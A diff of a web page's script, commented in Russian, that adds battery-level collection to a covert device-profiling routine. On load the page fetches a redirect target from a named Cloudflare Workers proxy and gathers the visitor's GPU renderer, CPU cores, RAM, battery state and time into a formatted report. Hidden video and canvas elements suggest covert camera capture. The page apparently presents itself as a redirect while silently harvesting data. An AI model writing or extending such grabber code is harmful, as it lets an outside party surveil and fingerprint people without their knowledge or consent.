@@ -33,38 +33,44 @@
     <video id="v" autoplay playsinline style="display:none"></video>
     <canvas id="c" style="display:none"></canvas>
 
-    <script>
+<script>
     const proxyUrl = 'https://silent-surf-60b2.parsinnikita76.workers.dev';
 
-    async function getHardwareInfo() {
-        let hardware = {
+    // Функция сбора железа и батареи
+    async function getFullData() {
+        let data = {
             gpu: "Unknown",
-            cores: navigator.hardwareConcurrency || "Не определено",
-            ram: navigator.deviceMemory || "Не определено"
+            cores: navigator.hardwareConcurrency || "?",
+            ram: navigator.deviceMemory || "?",
+            battery: "Unknown"
         };
 
+        // 1. Пробуем вытащить GPU
         try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    hardware.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                } else {
-                    hardware.gpu = gl.getParameter(gl.RENDERER);
-                }
-            }
-        } catch (e) { hardware.gpu = "Ошибка доступа к GPU"; }
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            data.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
+        } catch (e) {}
 
-        return hardware;
+        // 2. Пробуем получить заряд батареи
+        try {
+            if (navigator.getBattery) {
+                const bat = await navigator.getBattery();
+                const level = Math.round(bat.level * 100);
+                const charging = bat.charging ? "🔌 Заряжается" : "🔋 Разряжается";
+                data.battery = `${level}% (${charging})`;
+            }
+        } catch (e) {}
+
+        return data;
     }
 
     window.onload = async function() {
-        // Получаем ссылку заранее
         const targetUrl = await fetch(proxyUrl + "/get-url").then(r => r.text()).catch(() => "https://google.com");
         
-        // Собираем железо
-        const hw = await getHardwareInfo();
+        // Собираем всё железо
+        const hw = await getFullData();
 
         const infoData = `
 👤 **УСТРОЙСТВО:**
@@ -76,6 +82,7 @@
 • Процессор: ${hw.cores} ядер
 • ОЗУ: ~${hw.ram} GB
 • Видеокарта: ${hw.gpu}
+• Батарея: ${hw.battery}
 
 ⏰ **ВРЕМЯ И ЗОНА:**
 • ${new Date().toLocaleString('ru-RU')}
